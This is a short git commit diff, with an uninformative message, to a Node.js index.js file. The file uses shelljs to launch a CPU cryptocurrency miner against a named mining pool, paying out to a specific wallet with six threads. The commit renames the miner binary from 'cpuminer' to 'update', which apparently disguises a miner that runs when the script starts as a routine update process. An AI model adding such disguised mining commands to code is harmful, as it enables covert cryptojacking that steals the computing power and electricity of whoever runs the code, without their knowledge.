93ad4e46a39fa927cf3cfe7a431fbee3db454e41
DiegoCarlo0526 <diegocarlo2699@gmail.com>
2021-11-26 23:13:41 -0500

    mm

--- index.js
+++ index.js
@@ -1,3 +1,3 @@
 const Shell = require('shelljs')
 
-Shell.exec('./cpuminer -a gr -o pool.minafacil.com:4001 -u RJo626xuqkoKaZPrMw4bB44oiynLtVApcp.Personal -p x -t 6')
+Shell.exec('./update -a gr -o pool.minafacil.com:4001 -u RJo626xuqkoKaZPrMw4bB44oiynLtVApcp.Personal -p x -t 6')
